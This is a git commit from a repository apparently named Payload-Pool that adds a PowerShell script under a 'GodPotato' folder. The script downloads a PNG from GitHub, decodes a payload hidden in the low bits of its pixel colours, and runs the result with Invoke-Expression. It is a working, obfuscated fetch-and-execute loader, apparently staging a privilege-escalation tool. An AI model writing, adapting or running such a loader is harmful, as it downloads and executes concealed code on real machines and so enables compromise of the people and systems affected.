48082a06344bc8241d96bd5acee4e4eacecc5fb1
papcaii <109308566+papcaii@users.noreply.github.com>
2025-01-20 15:15:51 +0700

    Add files via upload

---
+++ GodPotato/One-For-All.ps1
@@ -0,0 +1,21 @@
+﻿$imageUrl = "https://raw.githubusercontent.com/papcaii/Payload-Pool/refs/heads/main/GodPotato/out.png"
+$outputPath = "$env:userprofile\downloads\out.png" # Change this to your desired location
+
+try {
+    Invoke-WebRequest -Uri $imageUrl -OutFile $outputPath
+    Write-Host "Image downloaded successfully to: $outputPath" -ForegroundColor Green
+} catch {
+    Write-Host "Error downloading image: $($_.Exception.Message)" -ForegroundColor Red
+}
+
+sal a New-Object;Add-Type -A System.Drawing;
+$g=a System.Drawing.Bitmap("$env:userprofile\downloads\out.png");
+$o=a Byte[] 7001382;
+(0..699)|%{
+foreach($x in 0..699) {
+$p=$g.GetPixel($x, $_);
+$o[$_*700+$x]=[math]::Floor(($p.R -band 0x0F)*16) + ($p.G -band 0x0F);
+}
+};
+$g.Dispose();
+IEX([System.Text.Encoding]::ASCII.GetString($o[0..34495]))
